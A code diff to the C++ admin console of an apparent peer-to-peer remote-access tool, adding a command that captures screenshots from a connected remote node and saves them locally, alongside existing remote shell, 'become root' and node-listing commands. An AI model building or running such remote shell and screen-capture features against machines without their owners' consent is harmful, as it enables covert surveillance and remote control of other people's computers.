@@ -3,9 +3,11 @@
 #include <sstream>
 #include <chrono>
 
+
 Admin::Admin(int port) {
+    image_path_ = "C://scrshts";
     node_ = std::make_shared<Node>(static_cast<uint16_t>(port));
-    Logger::get().set_level(LogLevel::ERR);
+    Logger::get().set_level(LogLevel::DEBUG);
 
     node_->set_shell_out_callback([this](ShellOut out) {
         {
@@ -14,7 +16,13 @@ Admin::Admin(int port) {
         }
         cv_.notify_one();
     });
-
+    node_->set_scrsht_out_callback([this](std::vector<uint8_t> out) {
+        {
+            std::lock_guard lock(cv_mtx_scrsht_);
+            pending_scrsht_outs_.push_back(std::move(out));
+        }
+        cv_scrsht_.notify_one();
+    });
     node_->set_admin();
 
     node_->start();
@@ -68,13 +76,33 @@ void Admin::run_shell_session() {
         }
         if (line.empty()) continue;
 
+        if (line == "scrsht") {
+            { std::lock_guard lock(cv_mtx_scrsht_); pending_scrsht_outs_.clear(); }
+            node_->send_scrsht_cmd(active_session_dst_);
+
+            std::unique_lock lock(cv_mtx_scrsht_);
+            bool got = cv_scrsht_.wait_for(lock, std::chrono::seconds(30), [this]{return !pending_scrsht_outs_.empty(); });
+            if (got) {
+                for (const auto& o : pending_scrsht_outs_) {
+                    ++scrsht_count_;
+                    fs::path filename = image_path_ / ("screenshot" + std::to_string(scrsht_count_) + ".png");
+                    std::ofstream file(filename, std::ios::binary);
+                    file.write(reinterpret_cast<const char*>(o.data()), o.size());
+                }
+                pending_scrsht_outs_.clear();
+            } else {
+                std::cout << "[no response in 30s]\n";
+            }
+            continue;
+        }
+
         // discard any stale responses from previous timed-out commands
         { std::lock_guard lock(cv_mtx_); pending_outs_.clear(); }
 
         node_->send_shell_cmd(line, active_session_dst_);
 
         std::unique_lock lock(cv_mtx_);
-        bool got = cv_.wait_for(lock, std::chrono::seconds(30),
+        bool got = cv_.wait_for(lock, std::chrono::seconds(15),
                                 [this] { return !pending_outs_.empty(); });
         if (got) {
             for (const auto& o : pending_outs_) {
@@ -83,7 +111,7 @@ void Admin::run_shell_session() {
             }
             pending_outs_.clear();
         } else {
-            std::cout << "[no response in 30s]\n";
+            std::cout << "[no response in 15s]\n";
         }
     }
 }
@@ -91,11 +119,20 @@ void Admin::run_shell_session() {
 void Admin::run() {
     asio::post(node_->io(), [n = node_]{ n->handle_command("r"); });
 
+    if (!fs::is_directory(image_path_)) {
+        try {
+            if (!fs::create_directories(image_path_)) log_error("Failed to create screenshot directory");
+        } catch (const fs::filesystem_error &e) {
+            log_error("caught fail while creating screenshot directory: {}", e.what());
+        }
+    }
+
     std::cout << "commands:\n"
-                 "lst - list net members\n"
+                  "lst - list net members\n"
                  "cnct - connect to id\n"
                  "rt - become root\n"
-                 "rg - register\n";
+                 "rg - register\n\n"
+                 "sceenshots will wait in " << image_path_ << "\n";
 
     std::string line;
     while (std::cout << "admin> " && std::getline(std::cin, line)) {
